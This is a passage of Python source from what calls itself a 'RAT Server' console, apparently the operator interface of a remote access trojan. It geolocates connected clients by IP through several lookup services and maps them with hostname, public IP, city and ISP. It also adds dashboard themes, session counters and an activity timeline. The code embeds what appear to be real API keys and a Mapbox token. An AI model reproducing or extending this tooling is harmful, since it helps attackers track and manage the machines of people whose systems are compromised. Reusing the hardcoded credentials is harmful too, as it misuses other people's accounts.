                    if 'latitude' in data and 'longitude' in data:
                        return {
                            'latitude': float(data.get('latitude')),
                            'longitude': float(data.get('longitude')),
                            'country_name': data.get('country_name', ''),
                            'country_code': data.get('country_code2', ''),
                            'region_name': data.get('state_prov', ''),
                            'city': data.get('city', ''),
                            'zip': data.get('zipcode', ''),
                            'time_zone': {'name': data.get('time_zone', {}).get('name', '')},
                            'isp': data.get('isp', ''),
                            'accuracy': 5000,  # city-level accuracy
                            'source': 'ipgeolocation.io'
                        }
            except Exception as e:
                self.log_message(f"Error with ipgeolocation.io: {e}", is_error=True)
                self.services_status['ipgeolocation']['available'] = False
                self.services_status['ipgeolocation']['last_error'] = str(e)
                self.services_status['ipgeolocation']['error_count'] += 1
        
        # Try ipapi.co (another free service)
        try:
            response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if 'latitude' in data and 'longitude' in data:
                    return {
                        'latitude': data.get('latitude'),
                        'longitude': data.get('longitude'),
                        'country_name': data.get('country_name', ''),
                        'country_code': data.get('country_code', ''),
                        'region_name': data.get('region', ''),
                        'city': data.get('city', ''),
                        'zip': data.get('postal', ''),
                        'time_zone': {'name': data.get('timezone', '')},
                        'isp': data.get('org', ''),
                        'accuracy': 10000,  # less precise
                        'source': 'ipapi.co'
                    }
        except Exception as e:
            self.log_message(f"Error with ipapi.co: {e}", is_error=True)
        
        # Try extreme-ip-lookup.com (another free alternative)
        try:
            response = requests.get(f"https://extreme-ip-lookup.com/json/{ip}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('lat') and data.get('lon'):
                    return {
                        'latitude': float(data.get('lat')),
                        'longitude': float(data.get('lon')),
                        'country_name': data.get('country', ''),
                        'country_code': data.get('countryCode', ''),
                        'region_name': data.get('region', ''),
                        'city': data.get('city', ''),
                        'zip': '',
                        'time_zone': {'name': ''},
                        'isp': data.get('isp', ''),
                        'accuracy': 25000,  # low precision
                        'source': 'extreme-ip-lookup.com'
                    }
        except Exception as e:
            self.log_message(f"Error with extreme-ip-lookup.com: {e}", is_error=True)
        
        # Return None if all backup methods fail
        return None
    
    def get_ipstack_location(self, ip):
        """Get location data from ipstack API"""
        if self.ipstack_api_key == "0c84ae78bf00f2eeb7280af1803f93d5":
            return None
            
        import requests
        try:
            protocol = "https" if self.use_https else "http"
            response = requests.get(
                f"{protocol}://api.ipstack.com/{ip}?access_key={self.ipstack_api_key}&fields=ip,latitude,longitude,country_name,country_code,region_name,city,zip,location",
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'latitude' in data and 'longitude' in data:
                    # Add source information
                    data['source'] = 'ipstack'
                    data['accuracy'] = data.get('location', {}).get('accuracy_radius', 10) * 1000  # Convert km to m
                    return data
        except Exception as e:
            self.log_message(f"Error with ipstack API: {e}", is_error=True)
        
        return None
    
    def get_ipinfo_location(self, ip):
            """Get location data from ipinfo.io API"""
            if self.ipinfo_token == "58950d8a1c1383":
                return None
                
            import requests
            try:
                response = requests.get(
                    f"https://ipinfo.io/{ip}/json?token={self.ipinfo_token}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if 'loc' in data and data['loc']:
                        try:
                            lat, lon = data['loc'].split(',')
                            lat, lon = float(lat), float(lon)
                            
                            # Create result in standard format
                            result = {
                                'latitude': lat,
                                'longitude': lon,
                                'country_name': data.get('country', ''),
                                'country_code': data.get('country', ''),
                                'region_name': data.get('region', ''),
                                'city': data.get('city', ''),
                                'zip': data.get('postal', ''),
                                'time_zone': {'name': data.get('timezone', '')},
                                'isp': data.get('org', ''),
                                'accuracy': 5000,  # ipinfo is usually city-level accurate (~5km)
                                'source': 'ipinfo'
                            }
                            
                            return result
                        except Exception as e:
                            self.log_message(f"Error parsing ipinfo.io response: {e}", is_error=True)
            except Exception as e:
                self.log_message(f"Error with ipinfo.io: {e}", is_error=True)
            
            return None
    
    def get_ipgeolocation_location(self, ip):
        """Get location data from ipgeolocation.io API"""
        if self.ipgeolocation_api_key == "df6c850929e54ae1801e2472127b1a8c":
            return None
            
        import requests
        try:
            response = requests.get(
                f"https://api.ipgeolocation.io/ipgeo?apiKey={self.ipgeolocation_api_key}&ip={ip}",
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'latitude' in data and 'longitude' in data:
                    # Convert to standard format
                    result = {
                        'latitude': float(data.get('latitude')),
                        'longitude': float(data.get('longitude')),
                        'country_name': data.get('country_name', ''),
                        'country_code': data.get('country_code2', ''),
                        'region_name': data.get('state_prov', ''),
                        'city': data.get('city', ''),
                        'zip': data.get('zipcode', ''),
                        'time_zone': {'name': data.get('time_zone', {}).get('name', '')},
                        'isp': data.get('isp', ''),
                        'accuracy': 5000,  # city-level accuracy
                        'source': 'ipgeolocation.io'
                    }
                    
                    return result
        except Exception as e:
            self.log_message(f"Error with ipgeolocation.io: {e}", is_error=True)
        
        return None
    
    def get_ipapi_location(self, ip):
        """Get location data from ip-api.com"""
        import requests
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    # Convert to standard format
                    result = {
                        'latitude': data.get('lat'),
                        'longitude': data.get('lon'),
                        'country_name': data.get('country', ''),
                        'country_code': data.get('countryCode', ''),
                        'region_name': data.get('regionName', ''),
                        'city': data.get('city', ''),
                        'zip': data.get('zip', ''),
                        'time_zone': {'name': data.get('timezone', '')},
                        'isp': data.get('isp', ''),
                        'accuracy': 5000,  # city-level accuracy
                        'source': 'ip-api.com'
                    }
                    
                    return result
        except Exception as e:
            self.log_message(f"Error with ip-api.com: {e}", is_error=True)
        
        return None
    
    def update_tkinter_map(self):
        """Update the tkinter map with current client locations"""
        if self.map_type != "tkinter":
            return
            
        # Clear existing markers
        for marker_id in list(self.markers.keys()):
            marker = self.markers[marker_id]
            marker.delete()
        
        self.markers = {}
        
        # Add markers for all clients
        for client_id, location in self.client_locations.items():
            # Skip if coordinates are not valid (e.g. 0,0)
            if 'lat' not in location or 'lon' not in location:
                continue
                
            # Skip if coordinates are 0,0 (usually indicates failed geolocation)
            if location['lat'] == 0 and location['lon'] == 0:
                continue
                
            # Get client info
            info = location.get('info', {})
            ip = info.get('ip', 'Unknown')
            hostname = info.get('hostname', 'Unknown')
            location_name = info.get('location', 'Unknown')
            confidence = info.get('confidence', 'low')
            
            # Create marker with custom appearance based on confidence level
            if confidence == 'high':
                marker_color = "green"
                marker_text = client_id
            elif confidence == 'medium':
                marker_color = "orange"
                marker_text = client_id
            else:
                marker_color = "red"
                marker_text = "?"
                
            # Add the marker
            marker = self.map_widget.set_marker(
                location['lat'], 
                location['lon'], 
                text=marker_text,
                marker_color_circle=marker_color,
                command=self.on_marker_click
            )
            
            # Store in our markers dict with client_id as key
            self.markers[client_id] = marker
            
            # Set custom data on the marker for later use
            marker.client_id = client_id
        
        # Center map if clients are present
        if self.markers:
            # Find center of all markers
            total_lat = 0
            total_lon = 0
            count = 0
            
            for client_id, location in self.client_locations.items():
                if 'lat' in location and 'lon' in location and location['lat'] != 0 and location['lon'] != 0:
                    total_lat += location['lat']
                    total_lon += location['lon']
                    count += 1
            
            if count > 0:
                center_lat = total_lat / count
                center_lon = total_lon / count
                
                # Calculate appropriate zoom level based on client spread
                if count == 1:
                    zoom = 10  # City level for single client
                elif count <= 3:
                    zoom = 6   # Region level for a few clients
                elif count <= 10:
                    zoom = 4   # Country level
                else:
                    zoom = 2   # World level for many distributed clients
                
                # Set the map view
                self.map_widget.set_position(center_lat, center_lon)
                self.map_widget.set_zoom(zoom)
    
    def update_web_map(self):
        """Update the web-based map with current client locations"""
        if self.map_type != "web":
            return
            
        # For web-based map, we need to regenerate the HTML
        map_html = self.generate_web_map_html()
        
        # Update the HTML frame
        try:
            self.html_frame.load_html(map_html)
        except Exception as e:
            self.log_message(f"Error updating web map: {e}", is_error=True)
    
    def on_marker_click(self, marker):
        """Handle marker click event"""
        # Get client_id from marker
        client_id = getattr(marker, 'client_id', None)
        
        if client_id and client_id in self.client_locations:
            self.display_client_info(client_id)
    
    def show_client_details(self, coordinates=None):
        """Show client details for client nearest to the given coordinates"""
        if not coordinates:
            return
            
        lat, lon = coordinates
        client_id = self.find_closest_client(lat, lon)
        
        if client_id:
            self.display_client_info(client_id)
        else:
            self.log_message("No client found near this location")
    
    def display_client_info(self, client_id):
        """Display client information in the info panel"""
        import tkinter as tk
        
        if client_id not in self.client_locations:
            return
            
        # Get client data
        location = self.client_locations[client_id]
        info = location.get('info', {})
        
        # Update basic info text
        self.client_info_text.config(state=tk.NORMAL)
        self.client_info_text.delete(1.0, tk.END)
        
        basic_info = f"Client ID: {client_id}\n"
        basic_info += f"Hostname: {info.get('hostname', 'Unknown')}\n"
        basic_info += f"IP: {info.get('ip', 'Unknown')}\n"
        
        if info.get('public_ip') and info.get('public_ip') != info.get('ip'):
            basic_info += f"Public IP: {info.get('public_ip')}\n"
            
        basic_info += f"Location: {info.get('location', 'Unknown')}\n"
        basic_info += f"Coordinates: {location.get('lat', 0):.6f}, {location.get('lon', 0):.6f}\n"
        basic_info += f"Precision: {info.get('confidence', 'Unknown').title()}\n"
        
        self.client_info_text.insert(tk.END, basic_info)
        self.client_info_text.config(state=tk.DISABLED)
        
        # Update detailed location info
        self.location_info_text.config(state=tk.NORMAL)
        self.location_info_text.delete(1.0, tk.END)
        
        location_info = f"City: {info.get('city', 'Unknown')}\n"
        location_info += f"Region: {info.get('region', 'Unknown')}\n"
        location_info += f"Country: {info.get('country_name', 'Unknown')} ({info.get('country_code', 'Unknown')})\n"
        location_info += f"Postal Code: {info.get('zip', 'Unknown')}\n"
        location_info += f"Timezone: {info.get('timezone', 'Unknown')}\n"
        location_info += f"ISP: {info.get('isp', 'Unknown')}\n"
        location_info += f"Accuracy: {info.get('accuracy', 'Unknown')} meters\n"
        location_info += f"Data Source: {info.get('source', 'Unknown')}\n"
        
        if info.get('note'):
            location_info += f"\nNote: {info.get('note')}"
        
        self.location_info_text.insert(tk.END, location_info)
        self.location_info_text.config(state=tk.DISABLED)
    
    def change_map_provider(self, provider):
        """Change the map provider"""
        if self.map_type == "tkinter":
            # Update the map tiles based on provider
            if provider == "OpenStreetMap":
                self.map_widget.set_tile_server("https://a.tile.openstreetmap.org/{z}/{x}/{y}.png")
            elif provider == "Mapbox":
                # Mapbox requires an API key
                self.map_widget.set_tile_server("https://api.mapbox.com/styles/v1/mapbox/streets-v11/tiles/{z}/{x}/{y}?access_token=pk.eyJ1IjoiYXBrYWxlc3MiLCJhIjoiY205YWFkY3BlMDJ3YTJqczdlZDh1MGwycCJ9.MdnO3e-mGmmuXd2tG88t_Q")
            elif provider == "Google Maps":
                # Not directly supported in tkintermapview, use a compatible tile server
                self.map_widget.set_tile_server("https://mt1.google.com/vt/lyrs=m&x={x}&y={y}&z={z}")
            elif provider == "ESRI":
                self.map_widget.set_tile_server("https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/{z}/{y}/{x}")
                
            # Log the change
            self.log_message(f"Map provider changed to {provider}")
            
        elif self.map_type == "web":
            # For web-based map, update the tile layer and regenerate
            # The change will be applied in generate_web_map_html
            self.update_web_map()
    
    def change_map_type(self, map_type):
        """Change the map type (street, satellite, etc.)"""
        if self.map_type == "tkinter":
            # Update the map tiles based on type
            provider = self.provider_var.get()
            
            if provider == "Google Maps":
                if map_type == "Satellite":
                    self.map_widget.set_tile_server("https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}")
                elif map_type == "Hybrid":
                    self.map_widget.set_tile_server("https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}")
                elif map_type == "Terrain":
                    self.map_widget.set_tile_server("https://mt1.google.com/vt/lyrs=p&x={x}&y={y}&z={z}")
                else:  # Street
                    self.map_widget.set_tile_server("https://mt1.google.com/vt/lyrs=m&x={x}&y={y}&z={z}")
            
            elif provider == "ESRI":
                if map_type == "Satellite":
                    self.map_widget.set_tile_server("https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}")
                elif map_type == "Terrain":
                    self.map_widget.set_tile_server("https://server.arcgisonline.com/ArcGIS/rest/services/World_Topo_Map/MapServer/tile/{z}/{y}/{x}")
                else:  # Street
                    self.map_widget.set_tile_server("https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/{z}/{y}/{x}")
            
            # Log the change
            self.log_message(f"Map type changed to {map_type}")
            
        elif self.map_type == "web":
            # For web-based map, update the tile layer and regenerate
            self.update_web_map()
    
    def change_precision_level(self, level):
        """Change the location precision level"""
        self.log_message(f"Precision level changed to {level}")
        
        # Update the precision threshold based on level
        if level == "High":
            self.precision_threshold = 500  # 500 meters
        elif level == "Standard":
            self.precision_threshold = 1000  # 1 kilometer
        else:  # Approximate
            self.precision_threshold = 10000  # 10 kilometers
    
    def toggle_local_ip_lookup(self):
        """Toggle whether to resolve local IPs"""
        self.allow_local_ip_lookup = self.local_ip_var.get()
        self.log_message(f"Local IP resolution {'enabled' if self.allow_local_ip_lookup else 'disabled'}")
    
    def get_country_center(self, country_code):
        """Get the approximate center coordinates of a country by code"""
        # Dict of country centers (latitude, longitude)
        country_centers = {
            "US": (37.0902, -95.7129),  # United States
            "GB": (55.3781, -3.4360),   # United Kingdom
            "CA": (56.1304, -106.3468), # Canada
            "AU": (-25.2744, 133.7751), # Australia
            "DE": (51.1657, 10.4515),   # Germany
            "FR": (46.2276, 2.2137),    # France
            "IT": (41.8719, 12.5674),   # Italy
            "ES": (40.4637, -3.7492),   # Spain
            "JP": (36.2048, 138.2529),  # Japan
            "CN": (35.8617, 104.1954),  # China
            "IN": (20.5937, 78.9629),   # India
            "BR": (-14.2350, -51.9253), # Brazil
            "RU": (61.5240, 105.3188),  # Russia
            # Add more countries as needed
        }
        
        return country_centers.get(country_code.upper())
    
    def get_country_name(self, country_code):
        """Get the country name from country code"""
        
        country_names = {
            "US": "United States",
            "GB": "United Kingdom",
            "CA": "Canada",
            "AU": "Australia",
            "DE": "Germany",
            "FR": "France",
            "IT": "Italy",
            "ES": "Spain",
            "JP": "Japan",
            "CN": "China",
            "IN": "India",
            "BR": "Brazil",
            "RU": "Russia",
            "IQ": "Iraq",
            "AF": "Afghanistan",
            "AL": "Albania",
            "DZ": "Algeria",
            "AD": "Andorra",
            "AO": "Angola",
            "AG": "Antigua and Barbuda",
            "AR": "Argentina",
            "AM": "Armenia",
            "AT": "Austria",
            "AZ": "Azerbaijan",
            "BS": "Bahamas",
            "BH": "Bahrain",
            "BD": "Bangladesh",
            "BB": "Barbados",
            "BY": "Belarus",
            "BE": "Belgium",
            "BZ": "Belize",
            "BJ": "Benin",
            "BT": "Bhutan",
            "BO": "Bolivia",
            "BA": "Bosnia and Herzegovina",
            "BW": "Botswana",
            "BN": "Brunei",
            "BG": "Bulgaria",
            "BF": "Burkina Faso",
            "BI": "Burundi",
            "CV": "Cabo Verde",
            "KH": "Cambodia",
            "CM": "Cameroon",
            "CF": "Central African Republic",
            "TD": "Chad",
            "CL": "Chile",
            "CO": "Colombia",
            "KM": "Comoros",
            "CG": "Congo, Republic of the",
            "CD": "Congo, Democratic Republic of the",
            "CR": "Costa Rica",
            "CI": "Côte d'Ivoire",
            "HR": "Croatia",
            "CU": "Cuba",
            "CY": "Cyprus",
            "CZ": "Czech Republic",
            "DK": "Denmark",
            "DJ": "Djibouti",
            "DM": "Dominica",
            "DO": "Dominican Republic",
            "EC": "Ecuador",
            "EG": "Egypt",
            "SV": "El Salvador",
            "GQ": "Equatorial Guinea",
            "ER": "Eritrea",
            "EE": "Estonia",
            "SZ": "Eswatini",
            "ET": "Ethiopia",
            "FJ": "Fiji",
            "FI": "Finland",
            "GA": "Gabon",
            "GM": "Gambia",
            "GE": "Georgia",
            "GH": "Ghana",
            "GR": "Greece",
            "GD": "Grenada",
            "GT": "Guatemala",
            "GN": "Guinea",
            "GW": "Guinea-Bissau",
            "GY": "Guyana",
            "HT": "Haiti",
            "HN": "Honduras",
            "HU": "Hungary",
            "IS": "Iceland",
            "ID": "Indonesia",
            "IR": "Iran",
            "IE": "Ireland",
            "IL": "Israel",
            "JM": "Jamaica",
            "JO": "Jordan",
            "KZ": "Kazakhstan",
            "KE": "Kenya",
            "KI": "Kiribati",
            "KP": "North Korea",
            "KR": "South Korea",
            "KW": "Kuwait",
            "KG": "Kyrgyzstan",
            "LA": "Laos",
            "LV": "Latvia",
            "LB": "Lebanon",
            "LS": "Lesotho",
            "LR": "Liberia",
            "LY": "Libya",
            "LI": "Liechtenstein",
            "LT": "Lithuania",
            "LU": "Luxembourg",
            "MG": "Madagascar",
            "MW": "Malawi",
            "MY": "Malaysia",
            "MV": "Maldives",
            "ML": "Mali",
            "MT": "Malta",
            "MH": "Marshall Islands",
            "MR": "Mauritania",
            "MU": "Mauritius",
            "MX": "Mexico",
            "FM": "Micronesia",
            "MD": "Moldova",
            "MC": "Monaco",
            "MN": "Mongolia",
            "ME": "Montenegro",
            "MA": "Morocco",
            "MZ": "Mozambique",
            "MM": "Myanmar",
            "NA": "Namibia",
            "NR": "Nauru",
            "NP": "Nepal",
            "NL": "Netherlands",
            "NZ": "New Zealand",
            "NI": "Nicaragua",
            "NE": "Niger",
            "NG": "Nigeria",
            "MK": "North Macedonia",
            "NO": "Norway",
            "OM": "Oman",
            "PK": "Pakistan",
            "PW": "Palau",
            "PS": "Palestine",
            "PA": "Panama",
            "PG": "Papua New Guinea",
            "PY": "Paraguay",
            "PE": "Peru",
            "PH": "Philippines",
            "PL": "Poland",
            "PT": "Portugal",
            "QA": "Qatar",
            "RO": "Romania",
            "RW": "Rwanda",
            "KN": "Saint Kitts and Nevis",
            "LC": "Saint Lucia",
            "VC": "Saint Vincent and the Grenadines",
            "WS": "Samoa",
            "SM": "San Marino",
            "ST": "São Tomé and Príncipe",
            "SA": "Saudi Arabia",
            "SN": "Senegal",
            "RS": "Serbia",
            "SC": "Seychelles",
            "SL": "Sierra Leone",
            "SG": "Singapore",
            "SK": "Slovakia",
            "SI": "Slovenia",
            "SB": "Solomon Islands",
            "SO": "Somalia",
            "ZA": "South Africa",
            "SS": "South Sudan",
            "LK": "Sri Lanka",
            "SD": "Sudan",
            "SR": "Suriname",
            "SE": "Sweden",
            "CH": "Switzerland",
            "SY": "Syria",
            "TJ": "Tajikistan",
            "TZ": "Tanzania",
            "TH": "Thailand",
            "TL": "Timor-Leste",
            "TG": "Togo",
            "TO": "Tonga",
            "TT": "Trinidad and Tobago",
            "TN": "Tunisia",
            "TR": "Turkey",
            "TM": "Turkmenistan",
            "TV": "Tuvalu",
            "UG": "Uganda",
            "UA": "Ukraine",
            "AE": "United Arab Emirates",
            "UY": "Uruguay",
            "UZ": "Uzbekistan",
            "VU": "Vanuatu",
            "VA": "Vatican City",
            "VE": "Venezuela",
            "VN": "Vietnam",
            "YE": "Yemen",
            "ZM": "Zambia",
            "ZW": "Zimbabwe"
        }
        
        return country_names.get(country_code.upper(), "Unknown Country")
                
         


class UIEnhancer:
    """
    UI enhancement module for the RAT Server that provides:
    - Real-time performance visualization
    - Modern dashboard with data analytics
    - Interactive client map
    - Dark mode and high contrast themes
    - Responsive layout adjustments
    """
    
    def __init__(self, rat_server):
        """Initialize the UI enhancer with a RAT server instance"""
        self.rat_server = rat_server
        self.performance_data = {
            'cpu': [],
            'memory': [],
            'network': [],
            'clients': [],
            'timestamps': []
        }
        self.current_plots = {}
        self.animation_frames = {}
        
        # Add additional themes
        self.add_themes()
        
        # Add responsive layout handlers
        self.add_responsive_handlers()
        
        # Setup enhanced dashboard
        self.enhance_dashboard()
        
        # Start UI update timer
        self.rat_server.root.after(1000, self.update_ui_elements)
    
    def add_themes(self):
        """Add additional themes to the RAT server"""
        # High contrast theme for accessibility
        high_contrast = {
            "bg_color": "#000000",
            "fg_color": "#FFFFFF",
            "button_color": "#0050AA",
            "accent_color": "#FFFF00",
            "danger_color": "#FF0000",
            "success_color": "#00FF00",
            "warning_color": "#FFA500",
            "info_color": "#00FFFF",
            "card_color": "#000000",
            "hover_color": "#0066CC",
            "input_bg": "#333333",
            "border_color": "#FFFFFF"
        }
        
        # Cyberpunk theme for style
        cyberpunk = {
            "bg_color": "#0D0221",
            "fg_color": "#00FFFF",
            "button_color": "#D100D1",
            "accent_color": "#00FF9F",
            "danger_color": "#FF0055",
            "success_color": "#00FF9F",
            "warning_color": "#FFCC00",
            "info_color": "#00BBFF",
            "card_color": "#1A0B2E",
            "hover_color": "#FF00FF",
            "input_bg": "#160C36",
            "border_color": "#00FFFF"
        }
        
        # Minimal theme for clean look
        minimal = {
            "bg_color": "#FFFFFF",
            "fg_color": "#333333",
            "button_color": "#EEEEEE",
            "accent_color": "#007AFF",
            "danger_color": "#FF3B30",
            "success_color": "#34C759",
            "warning_color": "#FF9500",
            "info_color": "#5AC8FA",
            "card_color": "#F9F9F9",
            "hover_color": "#DDDDDD",
            "input_bg": "#FFFFFF",
            "border_color": "#DDDDDD"
        }
        
        # Add new themes to the RAT server
        self.rat_server.THEMES["High Contrast"] = high_contrast
        self.rat_server.THEMES["Cyberpunk"] = cyberpunk
        self.rat_server.THEMES["Minimal"] = minimal
    
    
    def add_responsive_handlers(self):
        """Add handlers for responsive layout adjustments"""
        # Bind to window resize events
        self.rat_server.root.bind("<Configure>", self.on_window_resize)
        
        # Store the initial window size
        self.last_width = self.rat_server.root.winfo_width()
        self.last_height = self.rat_server.root.winfo_height()
    
    def on_window_resize(self, event):
        """Handle window resize events"""
        # Only respond to actual window size changes, not other configure events
        if event.widget == self.rat_server.root:
            current_width = self.rat_server.root.winfo_width()
            current_height = self.rat_server.root.winfo_height()
            
            # Check if size actually changed
            if current_width != self.last_width or current_height != self.last_height:
                # Update stored size
                self.last_width = current_width
                self.last_height = current_height
                
                # Apply responsive adjustments
                self.adjust_layout_for_size(current_width, current_height)
    
    def adjust_layout_for_size(self, width, height):
        """Adjust layout based on window size"""
        # For small screens (width < 1000px)
        if width < 1000:
            # Collapse sidebar to icons only
            self.collapse_sidebar()
            
            # Switch to a more compact view
            self.use_compact_layout()
        else:
            # Expand sidebar
            self.expand_sidebar()
            
            # Use full layout
            self.use_full_layout()
    
    def collapse_sidebar(self):
        """Collapse sidebar to icon-only mode"""
        # Only proceed if sidebar isn't already collapsed
        if hasattr(self, 'sidebar_collapsed') and self.sidebar_collapsed:
            return
            
        # Remember labels to restore them later
        self.stored_labels = {}
        
        # Hide text from buttons and save them
        for child in self.rat_server.sidebar_frame.winfo_children():
            if isinstance(child, ctk.CTkFrame):
                for subchild in child.winfo_children():
                    if isinstance(subchild, ctk.CTkButton):
                        # Store the original text
                        self.stored_labels[subchild] = subchild.cget("text")
                        # Set to icon only
                        subchild.configure(text="")
            elif isinstance(child, ctk.CTkLabel) and child.cget("text") == "RAT Console":
                child.configure(text="RAT")
        
        # Reduce sidebar width
        self.rat_server.sidebar_frame.configure(width=80)
        
        self.sidebar_collapsed = True
    
    def expand_sidebar(self):
        """Expand sidebar to full mode"""
        # Only proceed if sidebar is collapsed
        if not hasattr(self, 'sidebar_collapsed') or not self.sidebar_collapsed:
            return
            
        # Restore text to buttons
        if hasattr(self, 'stored_labels'):
            for button, text in self.stored_labels.items():
                button.configure(text=text)
        
        # Restore title
        for child in self.rat_server.sidebar_frame.winfo_children():
            if isinstance(child, ctk.CTkLabel) and child.cget("text") == "RAT":
                child.configure(text="RAT Console")
        
        # Restore sidebar width
        self.rat_server.sidebar_frame.configure(width=200)
        
        self.sidebar_collapsed = False
    
    def use_compact_layout(self):
        """Switch to a compact layout for smaller screens"""
        # Reduce padding
        for tab in [self.rat_server.dashboard_frame, self.rat_server.clients_frame, 
                  self.rat_server.command_frame, self.rat_server.monitoring_frame]:
            for child in tab.winfo_children():
                # Reduce paddings
                info = child.grid_info() if hasattr(child, 'grid_info') else {}
                if info and 'padx' in info and info['padx'] > 2:
                    child.grid_configure(padx=2, pady=2)
                info = child.pack_info() if hasattr(child, 'pack_info') else {}
                if info and 'padx' in info and info['padx'] > 2:
                    child.pack_configure(padx=2, pady=2)
    
    def use_full_layout(self):
        """Restore full layout for larger screens"""
        # Restore padding
        for tab in [self.rat_server.dashboard_frame, self.rat_server.clients_frame, 
                  self.rat_server.command_frame, self.rat_server.monitoring_frame]:
            for child in tab.winfo_children():
                # Restore paddings
                info = child.grid_info() if hasattr(child, 'grid_info') else {}
                if info and 'padx' in info and info['padx'] < 5:
                    child.grid_configure(padx=5, pady=5)
                info = child.pack_info() if hasattr(child, 'pack_info') else {}
                if info and 'padx' in info and info['padx'] < 5:
                    child.pack_configure(padx=5, pady=5)
    
    def enhance_dashboard(self):
        """Add enhanced dashboard elements"""
        # Add summary cards
        self.add_summary_cards()
        
        # Add activity timeline
        self.add_activity_timeline()
    
    def add_summary_cards(self):
        """Add summary cards with key metrics to dashboard"""
        # Get current theme
        theme = self.rat_server.THEMES[self.rat_server.current_theme]
        
        # Create summary cards frame
        summary_frame = ctk.CTkFrame(self.rat_server.dashboard_frame, fg_color="transparent")
        summary_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Total clients card
        client_card = self.create_summary_card(
            summary_frame,
            "Total Clients",
            "0",
            "👥",
            theme["accent_color"]
        )
        client_card.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Active sessions card
        sessions_card = self.create_summary_card(
            summary_frame,
            "Active Sessions",
            "0",
            "🔌",
            theme["info_color"]
        )
        sessions_card.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Server uptime card
        uptime_card = self.create_summary_card(
            summary_frame,
            "Server Uptime",
            "00:00:00",
            "⏱️",
            theme["success_color"]
        )
        uptime_card.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Store references to update later
        self.summary_cards = {
            'clients': client_card,
            'sessions': sessions_card,
            'uptime': uptime_card
        }
        
        # Track with theme manager
        if hasattr(self.rat_server, 'theme_manager'):
            self.rat_server.theme_manager.track_widget(summary_frame)
            for card in self.summary_cards.values():
                self.rat_server.theme_manager.track_widget(card)
                for child in card.winfo_children():
                    self.rat_server.theme_manager.track_widget(child)
    
    def create_summary_card(self, parent, title, value, icon, accent_color):
        """Create a summary card with title, value and icon"""
        theme = self.rat_server.THEMES[self.rat_server.current_theme]
        
        # Create card frame
        card = ctk.CTkFrame(
            parent, 
            fg_color=theme["card_color"],
            corner_radius=0,
            border_color=accent_color,
            border_width=2,
            height=120
        )
        
        # Add icon
        icon_label = ctk.CTkLabel(
            card, 
            text=icon,
            font=ctk.CTkFont(size=24),
            text_color=accent_color
        )
        icon_label.pack(anchor=tk.W, padx=15, pady=(15, 5))
        
        # Add title
        title_label = ctk.CTkLabel(
            card, 
            text=title,
            font=ctk.CTkFont(size=12),
            text_color=theme["fg_color"]
        )
        title_label.pack(anchor=tk.W, padx=15, pady=(0, 5))
        
        # Add value
        value_label = ctk.CTkLabel(
            card, 
            text=value,
            font=ctk.CTkFont(size=24, weight="bold"),
            text_color=accent_color
        )
        value_label.pack(anchor=tk.W, padx=15, pady=(0, 15))
        
        # Store labels as attributes for updating
        card.icon_label = icon_label
        card.title_label = title_label
        card.value_label = value_label
        card.accent_color = accent_color
        
        return card
    
    def add_activity_timeline(self):
        """Add an activity timeline to the dashboard"""
        theme = self.rat_server.THEMES[self.rat_server.current_theme]
        
        # Create timeline frame
        timeline_frame = ctk.CTkFrame(
            self.rat_server.dashboard_frame,
            fg_color=theme["card_color"],
            corner_radius=0,
            border_color=theme["border_color"] if "border_color" in theme else None,
            border_width=1 if "border_color" in theme else 0
        )
        timeline_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Add header
        timeline_header = ctk.CTkLabel(
            timeline_frame, 
            text="RECENT ACTIVITY",
            font=ctk.CTkFont(family="Segoe UI", size=14, weight="bold"),
            text_color=theme["fg_color"]
        )
        timeline_header.pack(anchor=tk.W, padx=15, pady=10)
        
        # Create activity list with custom styling
        self.activity_list = tk.Frame(
            timeline_frame,
            background=theme["card_color"]
        )
        self.activity_list.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
        
        # Add some initial activities
        self.add_activity_item("Server started", "system", time.time())
        self.add_activity_item("Waiting for clients", "info", time.time())
        
        # Track with theme manager
        if hasattr(self.rat_server, 'theme_manager'):
            self.rat_server.theme_manager.track_widget(timeline_frame)
            self.rat_server.theme_manager.track_widget(timeline_header, "label")
            self.rat_server.theme_manager.track_widget(self.activity_list)
    
    def add_activity_item(self, message, activity_type, timestamp):
        """Add a new activity item to the timeline"""
        theme = self.rat_server.THEMES[self.rat_server.current_theme]
        
        # Get color based on activity type
        color_map = {
            "system": theme["fg_color"],
            "info": theme["info_color"],
            "success": theme["success_color"],
            "warning": theme["warning_color"],
            "error": theme["danger_color"],
            "client": theme["accent_color"]
        }
        color = color_map.get(activity_type, theme["fg_color"])
        
        # Get icon based on activity type
        icon_map = {
            "system": "🖥️",
            "info": "ℹ️",
            "success": "✅",
            "warning": "⚠️",
            "error": "❌",
            "client": "👤"
        }
        icon = icon_map.get(activity_type, "•")
        
        # Format timestamp
        time_str = time.strftime("%H:%M:%S", time.localtime(timestamp))
        
        # Create activity item frame
        item_frame = tk.Frame(
            self.activity_list,
            background=theme["card_color"]
        )
        item_frame.pack(fill=tk.X, pady=2)
        
        # Add colored icon with activity type
        icon_label = tk.Label(
            item_frame,
            text=icon,
            foreground=color,
            background=theme["card_color"],
            font=("Segoe UI", 10)
        )
        icon_label.pack(side=tk.LEFT, padx=(0, 5))
        
        # Add message
        message_label = tk.Label(
            item_frame,
            text=message,
            foreground=theme["fg_color"],
            background=theme["card_color"],
            font=("Segoe UI", 9),
            anchor="w",
            justify="left"
        )
